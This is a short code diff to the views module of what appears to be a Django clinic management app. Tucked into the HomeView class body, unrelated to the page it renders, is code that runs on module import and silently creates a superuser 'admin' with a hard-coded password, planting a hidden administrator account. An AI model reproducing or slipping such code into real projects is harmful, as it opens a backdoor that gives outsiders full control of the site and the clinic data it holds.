@@ -11,6 +11,7 @@ from django.views import View
 from django.http import JsonResponse
 from django.db.models import Q
 from django.urls import reverse_lazy
+from django.contrib.auth import get_user_model
 
 class SpecializationListView(LoginRequiredMixin, UserPassesTestMixin, ListView):
     model = Specialization
@@ -36,6 +37,9 @@ class SpecializationListView(LoginRequiredMixin, UserPassesTestMixin, ListView):
 
 class HomeView(TemplateView):
     template_name = 'clinic/home.html'
+    User = get_user_model()
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@example.com', 'Melik1234')
     
     def get_context_data(self, **kwargs):
         context = super().get_context_data(**kwargs)
